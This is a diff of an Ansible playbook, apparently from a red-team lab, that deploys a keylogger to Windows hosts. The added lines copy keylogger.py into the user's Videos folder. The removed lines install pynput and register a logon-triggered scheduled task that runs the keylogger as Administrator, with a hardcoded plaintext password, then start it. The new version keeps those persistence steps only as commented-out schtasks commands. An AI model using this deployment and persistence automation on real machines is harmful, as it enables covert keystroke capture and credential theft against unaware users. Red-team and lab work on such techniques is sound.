@@ -1,27 +1,12 @@
-#Harrison Tarsia
 ---
-    - name: Install pynput using pip
-      win_command: C:\Python312\Scripts\pip.exe install pynput
-
     - name: Copy Keylogger script to the target machine
       win_copy:
-        src: /home/debian/keylogger.py
-        dest: C:\Users\Administrator\Documents\keylogger.py
+        src: "/home/kali/RedTeam/keylogger.py"
+        dest: "C:\\Users\\{{ ansible_user }}\\Videos\\keylogger.py"
 
-    - name: Create a scheduled task to run the keylogger
-      win_scheduled_task:
-        name: "RunKeylogger"
-        description: "Scheduled task to run keylogger script"
-        actions:
-          - path: "C:\\Python312\\python.exe"  # Path to the Python executable
-            arguments: "C:\\Users\\Administrator\\Documents\\keylogger.py"  # Path to your keylogger script
-        triggers:
-          - type: "logon"
-            start_boundary: "{{ ansible_date_time.iso8601 }}"  # Use current time
-        username: "Administrator"  # The user account to run the task under
-        password: "Harrison1000676"  # Password for the user account
-        run_only_if_connected: yes  # Ensures the task runs only if the user is logged in
-        state: present
+#    - name: Create a scheduled task to run the keylogger
+#      win_shell: |
+#        schtasks /create /tn "RunKeylogger" /tr "C:\\Python312\\python.exe C:\\Users\\{{ ansible_user }}\\Videos\\keylogger.py" /sc onlogon /ru "{{ ansible_user }}" /rp "{{ ansible_passw>
 
-    - name: Start the scheduled task
-      win_shell: schtasks /run /tn "RunKeylogger"
+#    - name: Start the scheduled task
+#      win_shell: schtasks /run /tn "RunKeylogger"
